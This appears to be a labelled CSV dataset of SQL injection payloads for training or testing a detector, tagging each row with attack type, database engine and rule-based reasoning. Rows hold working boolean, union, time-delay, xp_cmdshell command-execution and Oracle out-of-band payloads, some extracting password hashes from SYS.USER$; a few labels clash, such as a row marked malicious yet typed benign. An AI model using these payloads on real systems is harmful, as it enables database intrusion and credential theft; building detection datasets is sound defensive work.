row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
690,"""&""",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
691,""" ) ) ;waitfor delay '0:0:__TIME__'--",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
692,select * from users where id = 1 + ( \ ) or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
693,select * from users where id = 1 or \+<\ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
694,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
695,"select * from users where id = 1 + @`\` union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @`\` union select detected — union_based injection (priority 7) on generic",rule-based
696,select * from users where id = 1 <@.. or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
697,"select * from users where id = 1 or "";."" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
698,"select * from users where id = 1 or 1#""? = 1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
699,"select * from users where id = 1 union select 1`\`,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
700,"select * from users where id = 1 or "";&"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
701,select * from users where id = '1' or \<1 or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
702,"select * from users where id = '1' + ( \ ) union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
703,t'exec master..xp_cmdshell 'nslookup www.googl ...,1,,rce,mssql,0.95,"xp_cmdshell, exec master detected — rce injection (priority 1) on mssql",rule-based
704,""" ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1,,time_blind,generic,0.95,benchmark ( is database-specific time-delay function — time-based blind inference (priority 5),rule-based
705,"select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
706,select * from users where id = '1' or $<\ or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
707,select,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
708,""" or 1 = 1--",1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
709,a' or 'a' = 'a,1,,boolean_blind,generic,0.85,or 'a' = 'a detected — boolean_blind injection (priority 8) on generic,rule-based
710,"select * from users where id = '1' <@._ union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @._ union select detected — union_based injection (priority 7) on generic",rule-based
711,"select * from users where id = 1 or @#"" ( = 1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @#"" ( = 1 union select detected — union_based injection (priority 7) on generic",rule-based
712,"admin"" ) or ( ""1"" = ""1""/*",1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
713,"select * from users where id = '1' or \.<$ union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
714,"select * from users where id = '1' union select ( 1 ) ,banner from v$version where rownum = 1 -- 1'",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
715,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
716,AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( GRANTED_ROLE ) ) FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER ) ) AND 'i' = 'i,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
717,"select * from users where id = 1 or 1#"" ( union select null,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
718,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
719,"select * from users where id = 1 or "".#"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
